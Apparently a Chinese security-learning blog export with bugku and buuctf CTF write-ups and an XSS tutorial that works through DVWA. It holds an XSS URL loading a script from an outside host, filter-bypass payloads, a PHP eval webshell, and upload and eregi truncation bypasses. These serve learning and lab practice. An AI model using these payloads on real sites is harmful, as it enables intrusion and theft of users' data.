<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> href=<span class="string">&quot;URL&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>再看后面，又是base64加密，解码以后得到urlcode加密，然后再解码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">&#x27;Location: hello.php?id=1&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$a=$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b=$_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;no no no no no no no&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">&quot;bugku is a nice plateform!&quot;</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">&quot;111&quot;</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$flag = <span class="string">&quot;flag&#123;***********&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">&quot;never never never give up !!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到以上代码，让我们康康这段代码写了啥</p>
<p>看看他这几个判断，首先是id为空则直接跳转一下连接，非空则不执行<br>接下来她会get获取id a b 三个变量的值，如果a当中有‘.’那么将会直接执行那个判断语句，</p>
<p>file_get_contents — 将整个文件读入一个字符串，这里指的是将$a所定义的文件读入一个字符串，<br>所以这里就是一个考点，不让我们直接导入文件，但是又需要读取文件，想到直前的php:/input<br>然后在下面写一个post:bugku is a nice plateform<br>再往下就是拿到flag的限制条件了:<br>我们先来看a吧<br>eregi(a,b,c)函数：<br>在b中寻找a，如果有匹配到，就将匹配项给c<br>在这题中，只有<strong>两个参数</strong>那个点要注意看！！是连接符，不是逗号，所以这里的意思是111和b的第一个字符进行连接，并和1114进行匹配，且b的第一个字符不能为4，长度要大于5<br>搜索知道</p>
<h4 id="ereg和eregi的截断漏洞："><a href="#ereg和eregi的截断漏洞：" class="headerlink" title="ereg和eregi的截断漏洞："></a>ereg和eregi的截断漏洞：</h4><p>①%00截断及遇到%00则默认为字符串的结束<br>②当ntf为数组时它的返回值不是FALSE</p>
<p>这里我们使用第一个漏洞</p>
<p>接下来就是id了，id他说要非空非零后面弱类型比较又要等于0，我们就去找找有没有松散比较的类型：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210130142655.png" alt="img" style="zoom:67%;"><br>从这个图我们知道，字符串和0是弱相等的，所以：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210130142755.png" alt="img" style="zoom:67%;"><br>综合以上即可得到flag</p>
]]></content>
      <tags>
        <tag>bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS漏洞</title>
    <url>/2021/01/28/XSS%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h1><p>XSS跨站脚本攻击(Cross Site Scripting),是将Java script代码插入web页面中，之后当用户浏览页面时, 会执行嵌套在web页面里面的Java script代码,从而达到攻击用户的目的。为了跟HTML里面的层叠样式表(CSS ,Cascading Style Sheets)作区分，所以叫作XSS.                                    <a id="more"></a></p>
<h2 id="XSS本质"><a href="#XSS本质" class="headerlink" title="XSS本质"></a>XSS本质</h2><p>恶意代码未经过滤，与网站正常的代码混在一起，浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。在部分情况下，由于输入的限制，注入的恶意脚本较短，但可以通过引入外部的脚本，并有浏览器执行，来完成比较复杂的攻击策略</p>
<h4 id="理解"><a href="#理解" class="headerlink" title="理解:"></a>理解:</h4><p>XSS攻击和sql注入还蛮像的，都是注入恶意语句，但是xss是针对网站的</p>
<h2 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h2><ul>
<li>来自用户的 UGC 信息//UGC:UGC 互联网术语，全称为User Generated Content，也就是用户生成内容，即用户原创内容</li>
<li>来自第三方的链接</li>
<li>URL 参数</li>
<li>POST 参数</li>
<li>Referer （可能来自不可信的来源）</li>
<li>Cookie （可能来自其他子域注入）</li>
</ul>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>根据攻击的来源，XSS攻击可以分为存储型，反射性和DOM型三种</p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">存储区</th>
<th>插入点</th>
</tr>
</thead>
<tbody><tr>
<td align="center">存储型XSS</td>
<td align="left">后端数据库</td>
<td>HTML</td>
</tr>
<tr>
<td align="center">反射型XSS</td>
<td align="left">URL</td>
<td>HTML</td>
</tr>
<tr>
<td align="center">DOM型XSS</td>
<td align="left">后端数据库/前段存储/URL</td>
<td>前段JavaScript</td>
</tr>
</tbody></table>
<p>参考：<a href="https://tech.meituan.com/2018/09/27/fe-security.html">https://tech.meituan.com/2018/09/27/fe-security.html</a></p>
<h3 id="反射型XSS攻击"><a href="#反射型XSS攻击" class="headerlink" title="反射型XSS攻击"></a>反射型XSS攻击</h3><p>反射型XSS漏洞常见于通过URL传递参数的功能，如网站搜索，跳转等。由于需要用户主动打开恶意的URL才能生效，攻击者往往会结合多种手段诱导用户点击。比如下面的URL：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://x.x.x.x:8080/dosomething?message=&quot;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://www.hacktest.com:8002/xss/hacker.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot; 或者 http://localhost/test.php?param=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<p>POST的内容也可以触发反射型XSS，只不过它的触发条件比较苛刻（构建表单提交页面，并引导用户点击），所以非常少见(但是不是可以)</p>
<h4 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h4><p>1.攻击者构造出特殊的URL，其中包含恶意代码.<br>2.用户打开有恶意代码的URL时，网站服务器端将恶意代码从URL取出，拼接在HTML返回给浏览器.<br>3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也会被执行。<br>4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户行为，调用目标网站接口执行攻击者指定的操作。</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210128131025.png" alt="img" style="zoom: 50%;">

<p><strong>注意：</strong>Chrome和Safari能够检测到url上的xss攻击，将网页拦截掉，但是其他浏览器不行，如IE和Firefox。<br>图片来源:<a href="https://www.cnblogs.com/54chensongxia/p/11643787.html">https://www.cnblogs.com/54chensongxia/p/11643787.html</a></p>
<h3 id="存储型XSS攻击"><a href="#存储型XSS攻击" class="headerlink" title="存储型XSS攻击"></a>存储型XSS攻击</h3><p>恶意脚本永久存储在目标服务器上，当浏览器请求数据时，脚本从服务器传回并执行，影响范围比反射型和DOM型更大，存储型XSS攻击的原因仍然是没有做好数据过滤：前端提交数据至服务器端时，没有做好过滤;服务端在按受到数据时，在存储之前，没有做过滤;前端从服务器端请求到数据，没有过滤输出。</p>
<h4 id="攻击步骤-1"><a href="#攻击步骤-1" class="headerlink" title="攻击步骤"></a>攻击步骤</h4><p>1.攻击者将恶意代码提交到目标网站的数据库中。<br>2.用户打开目标网站时，网站服务端将恶意代码从数据库中取出，拼接在HTML中返回给浏览器。<br>3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。<br>4.恶意代码窃取用户数据并发送到攻击者的网站，或冒充用户行为，调用目标网站接口执行攻击者指定的操作.<br>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖，商品评论，用户私信等。</p>
<h3 id="DOM型XSS攻击"><a href="#DOM型XSS攻击" class="headerlink" title="DOM型XSS攻击"></a>DOM型XSS攻击</h3><p>DOM型XSS攻击，实际上就是前端javascript代码不够严谨，把不可信的内容插入到了页面，在使用.innerHTML、.outerHTML、.appendChild、document.write()等API时要特别小心，不要把不可信的数据作为HTML插入到页面上，尽量使用.innerText、.textContent、.setAttribut()等.</p>
<h4 id="攻击步骤-2"><a href="#攻击步骤-2" class="headerlink" title="攻击步骤"></a>攻击步骤</h4><p>1.攻击者构造出特殊数据，其中包含恶意代码。<br>2.用户浏览器执行了恶意代码<br>3.恶意窃取用户数据并发送到攻击者的网站，或冒充用户行为，调用目标网站接口执行攻击者指定的操作.</p>
<p><strong>tip</strong>DOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端javascript自身的安全漏洞.</p>
<p>参考来源:<a href="https://www.cnblogs.com/54chensongxia/p/11643787.html">https://www.cnblogs.com/54chensongxia/p/11643787.html</a></p>
<p>学习完理论知识就可以开始实践了</p>
<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型:"></a>反射型:</h3><p>根据前面的介绍我们知道，反射型XSS主要是构造于URL上（GET类型）以DVWA为例</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210128143538.png" alt="img"></p>
<p>我们查看页面源码<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210128143908.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210128143852.png" alt="img" style="zoom:67%;"><br>当我们输入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)/</span>&gt;</span></span><br><span class="line">或者使用</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//直接使用脚本语言</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HTML <span class="tag">&lt;<span class="name">script</span>&gt;</span> 元素用于嵌入或引用可执行脚本。这通常用作嵌入或者指向 JavaScript 代码。</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/script">https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/script</a><br>以后，他在浏览器被渲染的时候，执行了 alert()函数后便会弹框<br>说明了，我们的危险语句在网页中发挥了作用<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210128144211.png" alt="img" style="zoom:67%;"></p>
<h3 id="存储型："><a href="#存储型：" class="headerlink" title="存储型："></a>存储型：</h3><p>存储型是指我们输入的代码被存储到数据库中，只要有用户点击该URL(产生查询数据库的操作)，xss语句即发挥作用<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210128191829.png" alt="img" style="zoom:50%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210128191858.png" alt="img" style="zoom: 50%;"></p>
<p>当我们从其他页面点回来这个页面，这个窗口就会马上跳出，为什么呢？<br>就如前面所说的，这个页面要展现留言，肯定是调用了查询数据库的功能，并将其显示在网页上，而我们之前输出的语句因为也被存储在同一个数据库中，被查询出来显示在网页上，就会执行其中的html语句，也就是这个弹窗</p>
<h3 id="DOM型："><a href="#DOM型：" class="headerlink" title="DOM型："></a>DOM型：</h3><p><strong>DOM 操作：可以简单理解成“元素操作“，类似于你要更换背景颜色，更换语言，或者删除</strong><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210128192944.png" alt="img" style="zoom:50%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210128193114.png" alt="img" style="zoom:67%;"><br>可以看到这里做了一个更换语言的代码，将原本的语言替换成我们更换的语言，我们在url上插入恶意语句，单击替换即可看到页面弹出框，为什么会弹出框，就是因为我们的script语句被html识别并执行了</p>
<h2 id="整理XSS常用语句及编码绕过"><a href="#整理XSS常用语句及编码绕过" class="headerlink" title="整理XSS常用语句及编码绕过"></a>整理XSS常用语句及编码绕过</h2><p>常用的测试语句有:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x(任意数)</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>关于svg（是一种图片格式）在HTML中可以使用的其他标签<a href="https://www.runoob.com/svg/svg-inhtml.html">https://www.runoob.com/svg/svg-inhtml.html</a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>标签定义超链接，用于从一张页面链接到另一张页面。</span><br><span class="line">标签的 href 属性用于指定超链接目标的 URL。href 属性的值可以是任何有效文档的相对或绝对 URL，包括片段标识符和 JavaScript 代码段。如果用户选择了 <span class="tag">&lt;<span class="name">a</span>&gt;</span> 标签中的内容，那么浏览器会尝试检索并显示 href 属性指定的 URL 所表示的文档，或者执行 JavaScript 表达式、方法和函数的列表。</span><br></pre></td></tr></table></figure>

<h3 id="绕过姿势："><a href="#绕过姿势：" class="headerlink" title="绕过姿势："></a>绕过姿势：</h3><p>这里有必要再了解一下浏览器的解码与编码（看博客http原理）</p>
<h4 id="JS编码："><a href="#JS编码：" class="headerlink" title="JS编码："></a>JS编码：</h4><p>JS提供了四种字符编码的策略：<br>1.三个八进制数字  如果个数不够，在前面补0 比如e的编码为\145<br>2.两个十六进制数字  同上                                                      \x65<br>3.四个十六进制数字                                                              \u0065<br>4.对于一些控制字符，使用特殊的C类型的转义风格（如\n和\r）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074(10);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h4><p>命名实体：以&amp;开头，以分号结尾，例如&lt;的编码为 “&amp;lt”<br>字符编码: 十进制，十六进制ASCII码或Unicode字符编码，样式为”&amp;#数值”<br>例如”&lt;”可以编码为”<code>&amp;#060;</code>“和<code>&amp;#x3c</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag"><span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span>:%61</span></span></span><br><span class="line"><span class="tag"><span class="string">%6c%65%72%74%28%32%29&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag"><span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span>:%61</span></span></span><br><span class="line"><span class="tag"><span class="string">%6c%65%72%74%28%32%29&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="实战——dvwa"><a href="#实战——dvwa" class="headerlink" title="实战——dvwa"></a>实战——dvwa</h2><h5 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h5><p>中级阶段是过滤了<code>&lt;script&gt;</code>标签<br>这里有两种绕过方法：1.使用其他类型的标签，例如<code>&lt;img&gt;</code><br>2.复写标签，跟sql注入的绕过一样，因为他这里也是值替换一次</p>
<h5 id="high"><a href="#high" class="headerlink" title="high"></a>high</h5><p>这里就是完全过滤script，复写也没用，所以就是用其他类型的标签进行绕过就行了</p>
<h5 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h5><p>记得们之前提过，控制字符被转化为实体编码，被解码后会被当做普通字符，这里将所有的控制字符都转码了，所以我们输入的语句就都不会被执行了。</p>
]]></content>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku3</title>
    <url>/2021/01/31/bugku3/</url>
    <content><![CDATA[<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p>提示说是文件包含漏洞，果然是，遍历了一次目录，没有什么收获，用御剑扫了一下，发现有一个文件上传的后台，上传一句话木马，发现被过滤了<code>&lt;?php ?&gt;</code> 想想有没有替代方式，突然想起来之前好像有个帖子说可以不用<br>&lt;?php                                              </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scrpit</span> <span class="attr">language</span>=<span class="string">php</span>&gt;</span>xxxxxxxx<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造一句话木马:          <a id="more"></a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是蚁剑连接一直报错<br>转换方法：使用system指令直接查找</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">php</span>&gt;</span><span class="javascript">system(<span class="string">&quot;find / -name flag*&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210202124233.png" alt="img" style="zoom:67%;">

<p>然后file/flag 就可以获得flag</p>
<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p>这是文件上传题，过滤了php文件包括其他文件<br>这里复习一下几个绕过吧:</p>
<p>00截断：不行，最终的文件名是不可控的，它会自动加上.jpg<br>使用其他后缀进行绕过，例如php4，并修改Content-Type，也就是修改MIME，但是还是不行，查了一下说是上面也有一处Content-Type: multipart，后面multipart有的字母改大写，但是不是很理解为什么<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210202124200.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">$flag &#x3D; &quot;flag&#123;test&#125;&quot;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">My name is margin,give me a image file not a php&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot; &#x2F;&gt; </span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">function global_filter()&#123;</span><br><span class="line">	$type &#x3D;  $_SERVER[&quot;CONTENT_TYPE&quot;];</span><br><span class="line">	if (strpos($type,&quot;multipart&#x2F;form-data&quot;) !&#x3D;&#x3D; False)&#123;</span><br><span class="line">		$file_ext &#x3D;  substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#39;.&#39;)+1);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext);</span><br><span class="line">		if (stripos($file_ext,&quot;php&quot;) !&#x3D;&#x3D; False)&#123;</span><br><span class="line">			die(&quot;Invalid File&lt;br &#x2F;&gt;&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">global_filter();</span><br><span class="line">if ((stripos($_FILES[&quot;file&quot;][&quot;type&quot;],&#39;image&#39;)!&#x3D;&#x3D; False) &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 10*1024*1024))&#123;</span><br><span class="line">	if ($_FILES[&quot;file&quot;][&quot;error&quot;] &#x3D;&#x3D; 0)&#123;</span><br><span class="line">		$file_ext &#x3D;  substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#39;.&#39;)+1);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext);</span><br><span class="line">        $allowexts &#x3D; array(&#39;jpg&#39;,&#39;gif&#39;,&#39;jpeg&#39;,&#39;bmp&#39;,&#39;php4&#39;);</span><br><span class="line">        if(!in_array($file_ext,$allowexts))&#123;</span><br><span class="line">            die(&quot;give me a image file not a php&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">		$_FILES[&quot;file&quot;][&quot;name&quot;]&#x3D;&quot;bugku&quot;.date(&#39;dHis&#39;).&quot;_&quot;.rand(1000,9999).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">	    if (file_exists(&quot;upload&#x2F;&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;</span><br><span class="line">	    	echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &lt;br &#x2F;&gt;&quot;;</span><br><span class="line">	    &#125;</span><br><span class="line">	    else&#123;</span><br><span class="line">	    	if (!file_exists(&#39;.&#x2F;upload&#x2F;&#39;))&#123;</span><br><span class="line">	    		mkdir (&quot;.&#x2F;upload&#x2F;&quot;);</span><br><span class="line">                system(&quot;chmod 777 &#x2F;var&#x2F;www&#x2F;html&#x2F;upload&quot;);</span><br><span class="line">	    	&#125;</span><br><span class="line">	    	move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload&#x2F;&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">                echo &quot;Upload Success&lt;br&gt;&quot;;</span><br><span class="line">                $filepath &#x3D; &quot;upload&#x2F;&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">	      	echo &quot;Stored in: &quot; .&quot;&lt;a href&#x3D;&#39;&quot; . $filepath . &quot;&#39; target&#x3D;&#39;_blank&#39;&gt;&quot; . $filepath . &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	if($_FILES[&quot;file&quot;][&quot;size&quot;] &gt; 0)&#123;</span><br><span class="line">		echo &quot;You was catched! :) &lt;br &#x2F;&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>收获:看了源码，原来，这题他就是故意要在那边弄一个判断，strpos区分大小写，所以multipart/form-data更改大小写就可以绕过了，你没改有的大小写，你就无法上传成功，感觉蛮无语的，就是让我们猜嘛，猜对就对了，算是收获了:不要把思维仅仅局限在过往的任何一个知识点上，任何地方可能都存在过滤，然后这题还是白名单，合着就是让我们猜php4==</p>
<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p>写解密算法</p>
<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p>扫描后台，得到一个robots.txt，打开后<br>得到<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210131193348.png" alt="img" style="zoom:67%;"></p>
<p>然后打开那个php 说我不是管理员，然后下面说要get x，我就让x=admin试试，就可以了。。。<br>跟学长小小吐槽了一下其中的莫名其妙后，发现果然还是自己太年轻，其实其中逻辑性推理性还挺强的，这题<br>首先他说你不是管理员，然后下面说get的x==password，这个时候其实我们会想，什么x会等于password啊，题目说我们不是管理员，就是在暗示我们password可能=admin，这其实考察的也是弱密码，所以也没什么地方值得无语的。</p>
<h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$KEY=<span class="string">&#x27;ctf.bugku.com&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$cookie = $_COOKIE[<span class="string">&#x27;BUGKU&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;25112&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)<span class="comment">//这个unserialize是反序列化</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>在小角落找到一个 try ?25112，得到以上代码，让我们一起康康：<br>他说存在flag.php，但是打开什么也没有再往下看，他说get一个值，就是25112，<br>然后再将cookie反序列化===key，那么我们这里就将ctf.bugku.com序列化试试<br>得到<code>s:13:&quot;ctf.bugku.com&quot;;</code><br>然后回到开始页面，burpsuit抓包，让cookie那一栏的值为 BUGKU=s:13:”ctf.bugku.com” 即可<br>要成为一个好的ctfer 眼神也是要好啊，不然这个 try ?25112真滴没找到</p>
]]></content>
      <tags>
        <tag>bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf1</title>
    <url>/2021/03/15/buuctf/</url>
    <content><![CDATA[<h2 id="Warm——up"><a href="#Warm——up" class="headerlink" title="Warm——up"></a>Warm——up</h2><a id="more"></a>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(<span class="comment">//mb_substr() 函数返回字符串的一部分</span></span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span 